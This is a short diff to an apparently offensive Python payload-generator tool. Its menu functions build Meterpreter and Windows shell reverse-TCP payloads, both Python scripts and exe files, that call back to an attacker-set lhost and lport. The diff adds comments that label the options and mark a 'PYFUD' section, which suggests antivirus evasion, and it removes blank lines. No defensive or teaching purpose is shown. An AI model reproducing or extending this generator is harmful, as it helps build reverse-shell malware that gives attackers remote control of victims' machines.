@@ -126,8 +126,7 @@ def pythonpayload():
         payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, '', '')
         time.sleep(2)
         menu()
-
-
+    #PYFUD starts here     
     elif inputpy == "2": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
@@ -175,11 +174,13 @@ def winpayload():
     asktb()
     if inputy2.strip() != "":
         winoutfile = inputy2
+    #WinMeterpeter    
     if inputwin == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
         time.sleep(2)
         menu()
+    #WinShell    
     if inputwin == "2":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
@@ -209,10 +210,7 @@ def androidpayload():
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
         time.sleep(2)
         androidpayload()   
-
-
     
-
 def menu():
     clearscreen()
     printopt("Python payload menu")
